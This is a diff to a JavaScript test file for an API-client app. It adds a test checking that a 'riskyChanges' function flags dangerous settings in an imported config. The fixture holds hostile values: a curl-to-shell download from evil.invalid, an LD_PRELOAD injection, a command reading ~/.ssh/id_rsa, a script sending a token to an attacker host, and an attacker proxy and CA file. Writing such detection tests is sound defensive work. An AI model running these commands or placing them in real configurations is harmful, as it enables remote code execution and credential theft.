@@ -6,7 +6,7 @@ import example from '../docs/examples/api-client.json' with { type: 'json' };
 
 globalThis.window = { electronAPI: { storageSet() {} } };
 const { DB } = await import('../renderer/app/store.js');
-const { applyConfig, summaryText, linkOperations, exportConfig, configRequestPaths, requestsOnly } = await import('../renderer/app/config.js');
+const { applyConfig, riskyChanges, summaryText, linkOperations, exportConfig, configRequestPaths, requestsOnly } = await import('../renderer/app/config.js');
 const { normalizeDB, AI_PROMPT_DEFAULTS } = await import('../renderer/app/store.js');
 const fresh = () => { Object.assign(DB, { projects: [], features: [], notes: [], tokenSources: [], settings: { sidebarWidth: 240, openTabs: [], activeTab: null } }); normalizeDB(DB); };
 const { validateSchema } = await import('../renderer/app/openapi/schema.js');
@@ -172,4 +172,37 @@ test('importing only chosen requests (and the token sources they use)', () => {
   assert.deepEqual(target.folders.map((f) => f.name), ['Pets', 'Admin']);
   assert.equal(target.envs.length, 0);
   assert.deepEqual(DB.settings.aiPrompt, AI_PROMPT_DEFAULTS);
+});
+
+test('riskyChanges: commands, scripts and TLS settings a file would change; re-applying the same file changes none', () => {
+  fresh();
+  const p = applyConfig(example, { codeFolder: '/work/pets' }).project;
+  assert.deepEqual(riskyChanges(example, { project: p, codeFolder: '/work/pets' }), [], 'nothing differs from what was applied');
+  const next = structuredClone(example);
+  next.tasks[0].command = 'curl https://evil.invalid/x.sh | sh';
+  next.tasks[0].env = { ...next.tasks[0].env, LD_PRELOAD: '/tmp/x.so' };
+  next.logSources.push({ name: 'Sneaky', type: 'command', command: 'cat ~/.ssh/id_rsa' });
+  next.project.scripts = { pre: 'request.url = "https://evil.invalid/?k=" + vars.get("token")' };
+  next.folders[0].requests[0].scripts = { post: 'log(1)' };
+  next.environments[0].network = { insecure: true, proxy: 'http://evil.invalid:8080', caFile: 'certs/evil.pem' };
+  next.settings = { proxy: { insecureUpstream: true } };
+  const changes = riskyChanges(next, { project: p, codeFolder: '/work/pets' });
+  const key = (c) => `${c.what}|${c.name}|${c.field}`;
+  assert.deepEqual(changes.map(key).sort(), [
+    `App settings|proxy|insecureUpstream`,
+    `Environment|${next.environments[0].name}|CA file`, `Environment|${next.environments[0].name}|ignore certificate errors`, `Environment|${next.environments[0].name}|proxy`,
+    'Log source|Sneaky|command', 'Log source|Sneaky|type',
+    'Project|' + p.name + '|pre-script',
+    `Request|${next.folders[0].name}/${next.folders[0].requests[0].name}|post-script`,
+    `Task|${next.tasks[0].name}|command`, `Task|${next.tasks[0].name}|env`,
+  ].sort());
+  const cmd = changes.find((c) => c.what === 'Task' && c.field === 'command');
+  assert.deepEqual([cmd.before, cmd.after], [example.tasks[0].command, 'curl https://evil.invalid/x.sh | sh']);
+  assert.equal(changes.find((c) => c.field === 'CA file').after, '/work/pets/certs/evil.pem');
+  assert.deepEqual(riskyChanges(next, { project: p, codeFolder: '/work/pets' }).length, changes.length, 'nothing was applied');
+  assert.equal(p.tasks[0].command, example.tasks[0].command);
+  // Into a new project, every command and script counts as a change.
+  fresh();
+  assert.ok(riskyChanges(example, { codeFolder: '/work/pets' }).some((c) => c.what === 'Task' && c.before === '' && c.after === example.tasks[0].command));
+  assert.deepEqual(riskyChanges({ requests: [{ name: 'a', url: 'http://x' }] }), []);
 });
